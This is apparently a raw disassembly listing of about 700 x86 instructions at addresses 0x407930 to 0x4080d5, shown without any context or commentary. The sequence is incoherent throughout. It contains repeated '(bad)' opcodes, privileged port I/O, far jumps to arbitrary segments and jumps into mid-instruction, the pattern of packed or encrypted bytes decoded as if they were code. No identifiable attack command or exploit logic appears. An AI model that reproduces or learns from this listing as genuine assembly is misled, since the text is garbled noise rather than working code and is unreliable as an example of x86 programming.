  407930:	addr16 pop esp
  407932:	arpl   WORD PTR [esi-0x77],bx
  407935:	cmp    eax,0x790ad921
  40793a:	mov    dl,0x5a
  40793c:	push   ss
  40793d:	pop    ss
  40793e:	and    eax,0x5a56a733
  407943:	int3   
  407944:	test   eax,0x4bb9481e
  407949:	mov    bh,0x85
  40794b:	xchg   esi,eax
  40794c:	sub    al,0x16
  40794e:	aad    0x5b
  407950:	mov    al,0x26
  407952:	mov    cl,0x90
  407954:	fs inc esp
  407956:	sbb    DWORD PTR [edi],ebx
  407958:	pop    ecx
  407959:	mov    ah,0xcb
  40795b:	les    eax,FWORD PTR [esi+0x59]
  40795e:	ret    
  40795f:	bound  eax,QWORD PTR [eax]
  407961:	lods   al,BYTE PTR es:[esi]
  407963:	adc    cl,dh
  407965:	xor    BYTE PTR [ebx+0x3],bl
  407968:	adc    DWORD PTR [eax+edx*8+0x2c],0xffffffc5
  40796d:	in     eax,0x71
  40796f:	sub    al,0x6d
  407971:	test   eax,0x26c24632
  407976:	pop    esi
  407977:	pop    es
  407978:	in     al,dx
  407979:	and    BYTE PTR [eax-0x3d],cl
  40797c:	cmp    al,0x14
  40797e:	jp     0x407921
  407980:	out    0x62,al
  407982:	add    esp,DWORD PTR [edi]
  407984:	xor    eax,0x74387940
  407989:	xor    al,0x58
  40798b:	push   ebx
  40798c:	xor    al,0x42
  40798e:	mov    dl,0x90
  407990:	test   BYTE PTR [edx-0x3e],bl
  407993:	in     eax,dx
  407994:	xor    ebp,ebx
  407996:	sbb    DWORD PTR [eax+eiz*1],ebp
  407999:	cmp    al,BYTE PTR [edi]
  40799b:	fld    DWORD PTR [ecx]
  40799d:	jns    0x407939
  40799f:	or     ah,BYTE PTR [ebx-0x7228976a]
  4079a5:	jl     0x4079b0
  4079a7:	scas   eax,DWORD PTR es:[edi]
  4079a8:	pop    esp
  4079a9:	mov    ebx,0xb9f7f38c
  4079ae:	inc    edx
  4079af:	dec    esi
  4079b0:	xor    BYTE PTR [eax],ah
  4079b2:	push   es
  4079b3:	daa    
  4079b4:	aaa    
  4079b5:	loopne 0x407955
  4079b7:	les    ecx,FWORD PTR [edi+0x3a]
  4079ba:	loopne 0x407969
  4079bc:	enter  0xaace,0x9c
  4079c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4079c1:	call   0xcc69859
  4079c6:	jb     0x4079c3
  4079c8:	shr    DWORD PTR [ebx+0x231f2bb2],0x4d
  4079cf:	adc    DWORD PTR [edx+ebx*1],ecx
  4079d2:	retf   0x2b93
  4079d5:	inc    eax
  4079d6:	or     DWORD PTR [ebp+0x3a],ecx
  4079d9:	sub    al,0xdb
  4079db:	xor    DWORD PTR [eax+0x7c],eax
  4079de:	push   ecx
  4079df:	es or  eax,0xdec40429
  4079e5:	out    dx,al
  4079e6:	es aad 0xc3
  4079e9:	push   ebx
  4079ea:	mov    edi,DWORD PTR [ecx-0x288552da]
  4079f0:	lds    esp,FWORD PTR [ebp+0x58]
  4079f3:	push   cs
  4079f4:	jbe    0x407a31
  4079f6:	push   edi
  4079f7:	push   esi
  4079f8:	lahf   
  4079f9:	push   edi
  4079fa:	dec    ebp
  4079fb:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4079fd:	lock and edi,DWORD PTR [esi-0x11]
  407a01:	in     al,dx
  407a02:	jno    0x407a14
  407a04:	bound  ebx,QWORD PTR [ebp+eiz*2+0x3e]
  407a08:	push   eax
  407a09:	retf   
  407a0a:	add    eax,edx
  407a0c:	add    DWORD PTR ds:0x920c0581,ebp
  407a12:	and    cl,BYTE PTR [edi+0x1a6fe36b]
  407a18:	ins    BYTE PTR es:[edi],dx
  407a19:	adc    al,0xec
  407a1b:	xor    esi,DWORD PTR [ebx+0x60]
  407a1e:	in     al,0x88
  407a20:	jmp    0x7397f968
  407a25:	into   
  407a26:	sub    dh,BYTE PTR [esi+ecx*8+0xe]
  407a2a:	ret    
  407a2b:	sbb    bl,BYTE PTR [esi+0x35]
  407a2e:	out    0x26,eax
  407a30:	inc    ebp
  407a31:	in     eax,0x2a
  407a33:	sbb    DWORD PTR [eax+esi*4],esi
  407a36:	iret   
  407a37:	iret   
  407a38:	push   0xffffffe8
  407a3a:	outs   dx,DWORD PTR ds:[esi]
  407a3b:	lahf   
  407a3c:	mov    ds:0xb962ef60,eax
  407a41:	xchg   ebp,eax
  407a42:	stc    
  407a43:	push   ebp
  407a44:	fsub   QWORD PTR [edi-0xb]
  407a47:	icebp  
  407a48:	jbe    0x407a41
  407a4a:	jmp    0x99b1:0x8e0fa3f4
  407a51:	cli    
  407a52:	rcr    BYTE PTR [ecx+0x319c30db],0xb4
  407a59:	out    dx,al
  407a5a:	pop    edx
  407a5b:	imul   edx,DWORD PTR ds:0xcf4b6257,0x13
  407a62:	jnp    0x4079fd
  407a64:	add    al,0xbe
  407a66:	pop    eax
  407a67:	pop    ecx
  407a68:	aaa    
  407a69:	xchg   ebx,eax
  407a6a:	iret   
  407a6b:	sbb    BYTE PTR [edx+0x63],dl
  407a6e:	gs pop edx
  407a70:	cs lahf 
  407a72:	pop    es
  407a73:	pop    ebp
  407a74:	sub    cl,ch
  407a76:	std    
  407a77:	repnz inc edx
  407a79:	adc    eax,0xb2578a72
  407a7e:	adc    BYTE PTR [edi],bh
  407a80:	and    al,0x31
  407a82:	and    BYTE PTR [esi-0x6d],cl
  407a85:	aaa    
  407a86:	std    
  407a87:	or     dh,BYTE PTR [esi+0x33]
  407a8a:	adc    al,0x50
  407a8c:	cmp    ah,BYTE PTR [ebp+0x6d]
  407a8f:	add    dh,bh
  407a91:	rcl    DWORD PTR [esp+eiz*2],1
  407a94:	sbb    al,BYTE PTR [eax-0x80]
  407a97:	and    al,0xcf
  407a99:	cwde   
  407a9a:	pop    eax
  407a9b:	inc    ebp
  407a9c:	iret   
  407a9d:	fsubrp st(6),st
  407a9f:	jbe    0x407b17
  407aa1:	pop    es
  407aa2:	cmp    BYTE PTR [edx-0x1975cd51],al
  407aa8:	std    
  407aa9:	bound  edi,QWORD PTR [edx+0x1406e099]
  407aaf:	add    ebx,DWORD PTR [edi+0x6c5f5f82]
  407ab5:	add    DWORD PTR [ebp-0x74],esi
  407ab8:	adc    cl,dl
  407aba:	sbb    ebp,edi
  407abc:	popf   
  407abd:	inc    esi
  407abe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407abf:	(bad)  
  407ac1:	fistp  DWORD PTR [ecx+0x7b3cb4db]
  407ac7:	dec    ebp
  407ac8:	sbb    DWORD PTR cs:[ebp+0x7e],esi
  407acc:	(bad)  
  407acd:	sbb    eax,0x8416dded
  407ad2:	lock xor dl,BYTE PTR [ebx+ebp*8+0x46]
  407ad7:	xor    eax,0x9f989ee
  407adc:	out    0x55,al
  407ade:	aaa    
  407adf:	and    bl,BYTE PTR [ebx+eax*1+0x1c661abd]
  407ae6:	ror    DWORD PTR [ebx+0x39a21aad],1
  407aec:	mov    al,ds:0x1f0b34be
  407af1:	and    al,0xdf
  407af3:	pushf  
  407af4:	(bad)  
  407af6:	(bad)  
  407af7:	inc    eax
  407af8:	shl    edi,0x1
  407afb:	mov    edx,0x95658314
  407b00:	call   0x7b2c16e3
  407b05:	imul   eax,DWORD PTR [edx],0x51
  407b08:	sbb    DWORD PTR [eax],esi
  407b0a:	rcl    dh,cl
  407b0c:	neg    cl
  407b0e:	ret    0x6993
  407b11:	ja     0x407aa4
  407b13:	icebp  
  407b14:	fld    DWORD PTR [edx-0x25fc9d79]
  407b1a:	xchg   esp,eax
  407b1b:	popa   
  407b1c:	adc    edx,DWORD PTR [edx-0x3c]
  407b1f:	xor    DWORD PTR [edx],ebx
  407b21:	clc    
  407b22:	dec    ebx
  407b23:	mov    BYTE PTR [ebx-0x68b2b44c],dh
  407b29:	rcr    ebp,cl
  407b2b:	shr    cl,0xc0
  407b2e:	fsubr  DWORD PTR [esi-0xa3771a7]
  407b34:	(bad)  
  407b35:	aas    
  407b36:	out    0xbe,al
  407b38:	es das 
  407b3a:	or     BYTE PTR [edx-0x41468b83],ch
  407b40:	jbe    0x407b11
  407b42:	xchg   edi,eax
  407b43:	sbb    DWORD PTR [esi+edx*2],esp
  407b46:	push   0xd19bb083
  407b4b:	inc    esp
  407b4c:	push   edx
  407b4d:	add    cl,BYTE PTR [ebx+0x3382309f]
  407b53:	mov    ecx,0xfc3ec61a
  407b58:	outs   dx,DWORD PTR ds:[esi]
  407b59:	jmp    0x7d0b:0x500f7b5b
  407b60:	aas    
  407b61:	pusha  
  407b62:	leave  
  407b63:	lods   al,BYTE PTR ds:[esi]
  407b64:	pop    esp
  407b65:	cwde   
  407b66:	jmp    0x2eef:0x3f02aef1
  407b6d:	fisub  WORD PTR [ebx]
  407b6f:	test   al,0xc5
  407b71:	xchg   DWORD PTR [ecx-0x6da90453],esp
  407b77:	dec    ecx
  407b78:	mov    fs,edi
  407b7a:	in     eax,0xd4
  407b7c:	or     eax,0x1af05ce4
  407b81:	les    edi,FWORD PTR [ecx+eax*2]
  407b84:	jmp    0x6a60c45b
  407b89:	fnstsw WORD PTR [edi+0x7d]
  407b8c:	mov    eax,0x53b4c570
  407b91:	popf   
  407b92:	or     bl,cl
  407b94:	push   edi
  407b95:	jno    0x407bb9
  407b97:	cld    
  407b98:	das    
  407b99:	add    DWORD PTR [ecx],ebx
  407b9b:	fistp  DWORD PTR [edx+edi*8]
  407b9e:	imul   ecx,DWORD PTR [eax],0x87960a69
  407ba4:	cmp    edi,DWORD PTR [ebx]
  407ba6:	stc    
  407ba7:	cdq    
  407ba8:	mov    ah,ah
  407baa:	pop    es
  407bab:	cld    
  407bac:	pop    esp
  407bad:	shl    DWORD PTR [esi],0x31
  407bb0:	and    ebx,DWORD PTR ss:[ebx]
  407bb3:	inc    edi
  407bb4:	repz retf 
  407bb6:	call   0xe20de0ed
  407bbb:	imul   DWORD PTR [eax-0x6728a7bc]
  407bc1:	sub    eax,0xc461f63e
  407bc6:	xor    DWORD PTR [esp+edx*2-0x4d576fdb],eax
  407bcd:	in     eax,0xa
  407bcf:	js     0x407c41
  407bd1:	loope  0x407bd8
  407bd3:	sub    BYTE PTR [edx],bl
  407bd5:	fcomp  QWORD PTR [ebx+ebp*4-0x759f65ca]
  407bdc:	test   BYTE PTR [edx],dl
  407bde:	ja     0x407b8f
  407be0:	sbb    DWORD PTR [eax-0x2e],edx
  407be3:	mov    al,ds:0xf73d6cec
  407be8:	mov    ebx,0x733e3b0a
  407bed:	rol    edi,1
  407bef:	outs   dx,DWORD PTR ds:[esi]
  407bf0:	pop    esi
  407bf1:	or     BYTE PTR [ecx+0x2c],bh
  407bf4:	jle    0x407c1d
  407bf6:	clc    
  407bf7:	add    eax,0x44288011
  407bfc:	push   ds
  407bfd:	sbb    dh,bl
  407bff:	sbb    ebx,DWORD PTR [ebx]
  407c01:	cmp    eax,0xe9966745
  407c06:	mov    dl,0xd3
  407c08:	dec    edi
  407c09:	pop    esp
  407c0a:	pop    ss
  407c0b:	xchg   ebp,eax
  407c0c:	outs   dx,DWORD PTR ds:[esi]
  407c0d:	and    esp,DWORD PTR [eax+edi*4+0x36]
  407c11:	add    DWORD PTR [eax-0x4c],edx
  407c14:	rcl    BYTE PTR [ecx+0x42],0xed
  407c18:	jno    0x407b9f
  407c1a:	xchg   BYTE PTR [eax+0x77],ah
  407c1d:	mov    edi,0x32c9c1c
  407c22:	or     DWORD PTR [ebx],esp
  407c24:	push   0x6b
  407c26:	out    0x8b,al
  407c28:	mov    dl,BYTE PTR [eax-0x66621c9]
  407c2e:	(bad)  
  407c2f:	lods   eax,DWORD PTR ds:[esi]
  407c30:	mov    ds:0x664e9198,eax
  407c35:	das    
  407c36:	dec    edi
  407c37:	(bad)  
  407c38:	mov    bl,0x4b
  407c3a:	iret   
  407c3b:	push   ecx
  407c3d:	cwde   
  407c3e:	nop
  407c3f:	adc    eax,edi
  407c41:	leave  
  407c42:	mov    ebp,0xa482255d
  407c47:	retf   
  407c48:	adc    eax,0x62d5b994
  407c4d:	test   eax,0x1eff307d
  407c52:	fadd   QWORD PTR [ebx+0x7e]
  407c55:	bound  ebp,QWORD PTR [ecx+0x413b3702]
  407c5b:	mov    cl,0x25
  407c5d:	mov    ss,WORD PTR [eax+0x75429e93]
  407c63:	in     al,0x53
  407c65:	jp     0x407c55
  407c67:	stc    
  407c68:	mov    bh,0x77
  407c6a:	jbe    0x407c39
  407c6c:	xchg   edi,eax
  407c6d:	mov    esp,0xb9fe0a
  407c72:	adc    DWORD PTR [eax+eax*4-0x6f],eax
  407c76:	and    ch,dl
  407c78:	mov    cl,BYTE PTR [ebx+0x64]
  407c7b:	stos   BYTE PTR es:[edi],al
  407c7c:	call   esi
  407c7e:	or     eax,0xcba1e4af
  407c83:	xchg   DWORD PTR [ecx-0x55],esp
  407c86:	std    
  407c87:	rcr    BYTE PTR [esi],0xec
  407c8a:	cmp    ch,BYTE PTR [eax+0x3d]
  407c8d:	imul   ecx,DWORD PTR [edi],0xffffff84
  407c90:	out    dx,eax
  407c91:	mov    al,ds:0xbd17e842
  407c96:	add    al,BYTE PTR [edi]
  407c98:	inc    edi
  407c99:	cmp    DWORD PTR [ebx+ecx*2+0x388e83c4],0xffffff8b
  407ca1:	mov    es,WORD PTR [edx+0x6f]
  407ca4:	outs   dx,DWORD PTR ds:[esi]
  407ca5:	test   eax,0xe3e38957
  407caa:	pop    ebp
  407cab:	jge    0x407cb2
  407cad:	push   0xf00652e
  407cb2:	jg     0x407cb6
  407cb4:	int3   
  407cb5:	push   cs
  407cb6:	retf   0x23dc
  407cb9:	xchg   esi,eax
  407cba:	cdq    
  407cbb:	in     al,dx
  407cbc:	adc    BYTE PTR [esi+0x2b],0x90
  407cc0:	jecxz  0x407d0c
  407cc2:	dec    edx
  407cc3:	add    edx,ebx
  407cc5:	sub    DWORD PTR [ebp+0x0],ebx
  407cc8:	pusha  
  407cc9:	nop
  407cca:	inc    edx
  407ccb:	arpl   WORD PTR [edx+0x10f72a8c],si
  407cd1:	stos   DWORD PTR es:[edi],eax
  407cd2:	fistp  DWORD PTR [edi+0x4a]
  407cd5:	ret    
  407cd6:	sbb    ebx,DWORD PTR [esi]
  407cd8:	jb     0x407d54
  407cda:	mul    DWORD PTR ds:0xd9106b2b
  407ce0:	xchg   ebp,eax
  407ce1:	jmpw   0x6023
  407ce5:	popf   
  407ce6:	mov    ds:0xf7248a92,al
  407ceb:	lahf   
  407cec:	jne    0x407ca1
  407cee:	add    DWORD PTR fs:[edi+esi*8],ebx
  407cf2:	arpl   WORD PTR [edi+0x41243a42],bp
  407cf8:	sub    eax,0x25dd8e66
  407cfd:	sti    
  407cfe:	jp     0x407cc3
  407d00:	fnstcw WORD PTR [eax-0x42]
  407d03:	test   eax,0xd1742d6
  407d08:	sbb    BYTE PTR [ebx-0x4f72eb2b],bh
  407d0e:	xchg   ecx,eax
  407d10:	push   esp
  407d11:	push   esi
  407d12:	pop    ss
  407d13:	sahf   
  407d14:	or     BYTE PTR ss:[ecx+0x2d],ah
  407d18:	gs pop ds
  407d1a:	sbb    eax,0xb80d0581
  407d1f:	xchg   esi,eax
  407d20:	add    al,BYTE PTR [ebx+edx*2]
  407d23:	adc    esi,DWORD PTR [esi+0x717cf82e]
  407d29:	call   0xe1d7a48c
  407d2e:	xor    BYTE PTR [eax+0x7af2b5f8],bl
  407d34:	(bad)  [edi]
  407d36:	ins    BYTE PTR es:[edi],dx
  407d37:	xor    eax,0x7c11cac9
  407d3c:	mov    ebp,0x40ed515e
  407d41:	jmp    0x2ce8:0x47035274
  407d48:	and    bh,BYTE PTR [edx]
  407d4a:	adc    al,0x6d
  407d4c:	mov    esp,0x89e9a3df
  407d51:	push   eax
  407d52:	rcr    DWORD PTR [ecx+0x726e9c22],1
  407d58:	xchg   esi,eax
  407d59:	add    DWORD PTR [edx+0x4a],esp
  407d5c:	mov    al,0xce
  407d5e:	push   ss
  407d5f:	ficomp DWORD PTR [edi]
  407d61:	(bad)  
  407d62:	push   ebp
  407d63:	iret   
  407d64:	ins    BYTE PTR es:[di],dx
  407d66:	push   esi
  407d67:	xchg   esp,eax
  407d68:	aas    
  407d69:	call   0x4496:0xe31f0d3a
  407d70:	inc    eax
  407d71:	jnp    0x407d38
  407d73:	out    0x86,eax
  407d75:	xchg   edx,eax
  407d76:	in     eax,dx
  407d77:	sti    
  407d78:	jbe    0x407d5b
  407d7a:	jge    0x407d23
  407d7c:	mov    ebx,0xda6f08f5
  407d81:	cmp    eax,0xeb11a4df
  407d86:	push   0xeaeddf8b
  407d8b:	fucomp st(1)
  407d8d:	sbb    eax,0x19ca9189
  407d92:	adc    cl,BYTE PTR [eax]
  407d94:	les    ebx,FWORD PTR [esi+0x3479dbbe]
  407d9a:	shl    DWORD PTR [esi+0x31],0x99
  407d9e:	fdivr  DWORD PTR [ecx+ebx*8+0x7]
  407da2:	dec    ebp
  407da3:	scas   eax,DWORD PTR es:[edi]
  407da4:	mov    BYTE PTR ds:0xb15762f4,dl
  407daa:	retf   
  407dab:	or     esi,ebx
  407dad:	inc    eax
  407dae:	jns    0x407da8
  407db0:	test   eax,0xff445c2d
  407db5:	in     eax,dx
  407db6:	add    al,0xde
  407db8:	lods   al,BYTE PTR ds:[esi]
  407db9:	jle    0x407d51
  407dbb:	(bad)  
  407dbc:	or     ebx,DWORD PTR [edx-0x5c]
  407dbf:	mov    ebx,0x34377ca3
  407dc4:	sub    ecx,ebp
  407dc6:	lods   eax,DWORD PTR ds:[esi]
  407dc7:	lahf   
  407dc8:	cmp    BYTE PTR [ebx-0x19],al
  407dcb:	fiadd  DWORD PTR [ebx]
  407dcd:	and    ebx,DWORD PTR [esi]
  407dcf:	dec    esi
  407dd0:	por    mm5,QWORD PTR [edi+0x56]
  407dd4:	daa    
  407dd5:	pop    edi
  407dd6:	or     edi,esi
  407dd8:	mov    ds:0x65523c73,al
  407ddd:	push   ss
  407dde:	mov    eax,0x9a10ba82
  407de3:	fcmovnu st,st(3)
  407de5:	jmp    0x407d7c
  407de7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407de8:	sti    
  407de9:	inc    edx
  407dea:	(bad)  
  407deb:	xchg   edi,eax
  407dec:	inc    edx
  407ded:	add    DWORD PTR [esp+eax*1+0x54],eax
  407df1:	xchg   edx,eax
  407df2:	in     eax,dx
  407df3:	out    0x6b,al
  407df5:	(bad)  
  407df6:	(bad)  
  407df7:	enter  0x3735,0x84
  407dfb:	or     eax,0xe3deac91
  407e00:	pop    es
  407e01:	loopne 0x407e14
  407e03:	adc    eax,0x4f73df85
  407e08:	mov    ah,0xc7
  407e0a:	adc    eax,DWORD PTR [edi-0x5f]
  407e0d:	pop    ss
  407e0e:	mov    ds:0x192f40e7,al
  407e13:	cmp    eax,0xe510a3cf
  407e18:	aam    0xe5
  407e1a:	xlat   BYTE PTR ds:[ebx]
  407e1b:	out    dx,al
  407e1c:	stos   BYTE PTR es:[edi],al
  407e1d:	pusha  
  407e1e:	adc    bh,ch
  407e20:	adc    cl,BYTE PTR [eax+0x7d]
  407e23:	xchg   sp,ax
  407e25:	bnd jnp 0x407e53
  407e28:	xor    bl,ah
  407e2a:	popa   
  407e2b:	xor    ch,ah
  407e2d:	aaa    
  407e2e:	fsubr  QWORD PTR [esi]
  407e30:	xchg   DWORD PTR [ecx+0x63],edi
  407e33:	adc    al,0x2a
  407e35:	out    0xbe,eax
  407e37:	xchg   ch,al
  407e39:	retf   
  407e3a:	pushf  
  407e3b:	rcr    esi,cl
  407e3d:	(bad)  
  407e3e:	xchg   esp,eax
  407e3f:	lock jp 0x407e94
  407e42:	xchg   esi,eax
  407e43:	adc    esp,ebp
  407e45:	adc    al,0x0
  407e47:	sub    DWORD PTR [eax-0x28042e0b],0xb82cee2
  407e51:	in     al,0x8b
  407e53:	dec    edi
  407e54:	rcl    al,cl
  407e56:	adc    eax,0x12b6e6ec
  407e5b:	jne    0x407e07
  407e5d:	fld    QWORD PTR [ebp+ebx*8+0x4c00504f]
  407e64:	mov    ds:0xc644c682,al
  407e69:	dec    eax
  407e6a:	cmp    dl,dh
  407e6c:	mov    eax,ds:0x92da6db9
  407e71:	add    cl,BYTE PTR [ebx-0x8]
  407e74:	sbb    ebx,DWORD PTR [ecx+0xa74f63b]
  407e7a:	sbb    esi,DWORD PTR [edi-0x9505096]
  407e80:	adc    cl,BYTE PTR [eax]
  407e82:	xlat   BYTE PTR ds:[ebx]
  407e83:	mov    al,0x3a
  407e85:	jp     0x407e08
  407e87:	xor    DWORD PTR [edx],0xffffffe1
  407e8a:	sbb    al,0x44
  407e8c:	outs   dx,DWORD PTR ds:[esi]
  407e8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e8e:	das    
  407e8f:	push   ss
  407e90:	xor    DWORD PTR [ecx-0x3fef4e31],0xbb4d60b1
  407e9a:	add    eax,0x345df239
  407e9f:	jno    0x407e98
  407ea1:	pusha  
  407ea2:	hlt    
  407ea3:	out    dx,al
  407ea4:	sar    eax,cl
  407ea6:	xor    esi,DWORD PTR [eax-0x70c60ad5]
  407eac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ead:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407eae:	loopne 0x407e32
  407eb0:	aas    
  407eb1:	fwait
  407eb2:	xor    ah,dh
  407eb4:	push   cs
  407eb5:	frstor [edx-0x2c]
  407eb8:	adc    ebp,eax
  407eba:	popf   
  407ebb:	stc    
  407ebc:	in     al,dx
  407ebd:	dec    ecx
  407ebe:	mov    bl,0x42
  407ec0:	repnz push edi
  407ec2:	xor    cl,BYTE PTR [eax-0x4974e716]
  407ec8:	pop    esi
  407ec9:	push   es
  407eca:	mov    dh,0xbb
  407ecc:	mov    edi,0x4e2b34e4
  407ed1:	aas    
  407ed2:	add    eax,DWORD PTR [edx-0x7a]
  407ed5:	pusha  
  407ed6:	mov    ebp,0x4fbece17
  407edb:	mov    bh,0xee
  407edd:	sbb    al,0xd1
  407edf:	inc    ebx
  407ee0:	imul   ebx,DWORD PTR [esi+esi*8+0x2],0x2ecaeeb9
  407ee8:	fstp   TBYTE PTR [ebx-0x15]
  407eeb:	std    
  407eec:	pop    esi
  407eed:	mov    ebx,0x8462e5d6
  407ef2:	dec    ebx
  407ef3:	xchg   ebx,eax
  407ef4:	scas   al,BYTE PTR es:[edi]
  407ef5:	(bad)  
  407ef6:	clc    
  407ef7:	and    eax,0x98be5d98
  407efc:	pop    ebp
  407efd:	test   DWORD PTR [eax+0x44],esp
  407f00:	dec    edx
  407f01:	mov    al,0x58
  407f03:	add    BYTE PTR [ecx+0x1e],cl
  407f06:	mov    fs,ebp
  407f08:	out    dx,al
  407f09:	adc    edi,DWORD PTR [eax-0x3f950426]
  407f0f:	add    ebp,DWORD PTR [eax+edx*4+0x57]
  407f13:	lock dec BYTE PTR [edi-0x32f73492]
  407f1a:	push   esi
  407f1b:	das    
  407f1c:	dec    ecx
  407f1d:	scas   eax,DWORD PTR es:[edi]
  407f1e:	adc    eax,0xd19cf5c6
  407f23:	push   ss
  407f24:	push   edx
  407f25:	daa    
  407f26:	pop    edx
  407f27:	test   dl,al
  407f29:	mov    ebp,0x8395af5f
  407f2e:	jmp    0x263c:0x81ca31df
  407f35:	sbb    al,ah
  407f37:	out    dx,al
  407f38:	ret    0x1c5a
  407f3b:	push   esi
  407f3c:	xor    DWORD PTR [eax+0x4e8fa601],0x57
  407f43:	in     al,0x85
  407f45:	lods   al,BYTE PTR ds:[esi]
  407f46:	jp     0x407f2d
  407f48:	cmp    al,0xd
  407f4a:	call   0x6c6:0x4c1b956d
  407f51:	imul   ecx,DWORD PTR [ecx],0xaec0bcaf
  407f57:	xchg   edx,eax
  407f58:	fistp  DWORD PTR [edx]
  407f5a:	fyl2xp1 
  407f5c:	cdq    
  407f5d:	push   0xb38a0aa3
  407f62:	in     al,0xcd
  407f64:	adc    al,0x60
  407f66:	add    ebp,eax
  407f68:	repnz adc BYTE PTR [ebx],dl
  407f6b:	mov    edi,edi
  407f6d:	xor    DWORD PTR ds:0xad010b34,ebx
  407f73:	loope  0x407fd6
  407f75:	shr    esi,0x93
  407f78:	mov    esp,0x9519672e
  407f7d:	ds pop es
  407f7f:	es dec ecx
  407f81:	mov    ecx,0xe7a00b5a
  407f86:	outs   dx,BYTE PTR ds:[esi]
  407f87:	out    dx,al
  407f88:	(bad)  
  407f89:	ret    
  407f8a:	das    
  407f8b:	jmp    0x407f25
  407f8d:	jbe    0x407fb3
  407f8f:	sub    eax,DWORD PTR ds:0x450f7759
  407f95:	dec    esp
  407f96:	scas   eax,DWORD PTR es:[edi]
  407f97:	sbb    al,0x4b
  407f99:	xor    esi,DWORD PTR [esi-0x3a404d81]
  407f9f:	xor    esp,DWORD PTR [esi+0x23]
  407fa2:	in     eax,0xcc
  407fa4:	retf   0x8cb0
  407fa7:	lahf   
  407fa8:	movsx  edi,dx
  407fab:	fidivr WORD PTR [ebx+0x4a]
  407fae:	pusha  
  407faf:	aad    0xfb
  407fb1:	jnp    0x40800a
  407fb3:	lahf   
  407fb4:	pop    ebx
  407fb5:	cld    
  407fb6:	cmp    DWORD PTR [edx-0x6bed726a],ecx
  407fbc:	cmp    BYTE PTR [ebx+0x28],0xbe
  407fc0:	dec    ecx
  407fc1:	nop
  407fc2:	dec    ecx
  407fc3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407fc4:	push   ecx
  407fc5:	inc    edx
  407fc6:	shl    esp,cl
  407fc8:	mov    ds:0x4fc0d64c,eax
  407fcd:	cs push esi
  407fcf:	shr    esp,0xff
  407fd2:	sbb    esp,DWORD PTR [esi]
  407fd4:	mov    ebx,gs
  407fd6:	aas    
  407fd7:	or     ebp,0x35
  407fda:	aam    0xea
  407fdc:	(bad)  
  407fdd:	pusha  
  407fde:	out    dx,eax
  407fdf:	pusha  
  407fe0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407fe1:	or     cl,BYTE PTR [eax+ebx*2]
  407fe4:	ficomp DWORD PTR [edi-0x621d2a11]
  407fea:	jp     0x408045
  407fec:	fnstcw WORD PTR [eax-0x5e]
  407fef:	mov    al,0x2
  407ff1:	xchg   ebx,eax
  407ff2:	mov    edi,0x193a03ea
  407ff7:	icebp  
  407ff8:	cs fdiv st(6),st
  407ffb:	js     0x407fb7
  407ffd:	mov    eax,ds:0xc4b10d8a
  408002:	jl     0x408040
  408004:	fwait
  408005:	cdq    
  408006:	outs   dx,DWORD PTR ds:[esi]
  408007:	in     al,0xd2
  408009:	nop
  40800a:	cmp    al,0x3d
  40800c:	sar    BYTE PTR ds:[eax-0x60],1
  408010:	pop    es
  408011:	cli    
  408012:	xchg   ecx,eax
  408013:	mov    WORD PTR [ebx],cs
  408015:	sbb    BYTE PTR [edx],ch
  408017:	adc    DWORD PTR [eax],edi
  408019:	push   edx
  40801a:	mov    al,ds:0x6b2e8c96
  40801f:	xor    DWORD PTR [ebx*4-0x6d5e0c40],ebx
  408026:	sub    eax,0x4c29031d
  40802b:	sbb    eax,0x5ef436b1
  408030:	gs int3 
  408032:	in     al,dx
  408033:	aad    0xf3
  408035:	xor    al,dh
  408037:	nop
  408038:	pop    ss
  408039:	enter  0x18ef,0x29
  40803d:	inc    eax
  40803e:	pop    esp
  40803f:	repnz push esi
  408041:	xchg   edx,eax
  408042:	mov    BYTE PTR [edi+0x27],bh
  408045:	pop    ebx
  408046:	or     DWORD PTR [ebp-0x1b399b7a],ecx
  40804c:	cmp    BYTE PTR [edi+0x63],dl
  40804f:	hlt    
  408050:	mov    BYTE PTR ds:0x36afad17,bl
  408056:	gs dec ebp
  408058:	push   esp
  408059:	ins    BYTE PTR es:[edi],dx
  40805a:	cmp    DWORD PTR [edi+edi*8-0x58],0xf77d3859
  408062:	adc    BYTE PTR [edi-0x6],0xb5
  408066:	jp     0x4080dd
  408068:	aas    
  408069:	std    
  40806a:	pop    edx
  40806b:	xchg   ebp,eax
  40806c:	adc    cl,0x91
  40806f:	addr16 inc ebx
  408071:	jmp    0xaef7dc57
  408076:	adc    al,0xdf
  408078:	lods   al,BYTE PTR ds:[esi]
  408079:	dec    ecx
  40807a:	shr    BYTE PTR cs:[ebx-0x1eafd902],0x51
  408082:	cdq    
  408083:	pop    edx
  408084:	sbb    al,dh
  408086:	pop    es
  408087:	hlt    
  408088:	sar    BYTE PTR [ecx+0x4e],cl
  40808b:	retf   0x2d07
  40808e:	dec    ebx
  40808f:	icebp  
  408090:	aaa    
  408091:	pop    esi
  408092:	push   cs
  408093:	adc    dh,BYTE PTR [eax]
  408095:	jno    0x4080c3
  408097:	pop    eax
  408098:	test   al,bh
  40809a:	xchg   esp,eax
  40809b:	into   
  40809c:	sub    al,0x28
  40809e:	lock call FWORD PTR [edi]
  4080a1:	adc    DWORD PTR [edi+0x32b78044],ecx
  4080a7:	(bad)  
  4080a8:	push   edx
  4080a9:	pop    ds
  4080aa:	lods   eax,DWORD PTR ds:[esi]
  4080ab:	daa    
  4080ac:	lahf   
  4080ad:	cmp    dl,BYTE PTR [edx]
  4080af:	mov    ebp,0xfa8c1eb7
  4080b4:	sbb    DWORD PTR [ebx],esp
  4080b6:	aaa    
  4080b7:	xchg   ecx,eax
  4080b8:	and    eax,0xf72d86f8
  4080bd:	pushf  
  4080be:	jmp    0x9d3fbbc2
  4080c3:	pop    ebp
  4080c4:	jns    0x40810d
  4080c6:	mov    cl,0x1c
  4080c8:	test   BYTE PTR [edi-0x44],0x72
  4080cc:	aad    0x9f
  4080ce:	cwde   
  4080cf:	mov    edx,0x3be1e68e
  4080d4:	push   edi
  4080d5:	jnp    0x408125
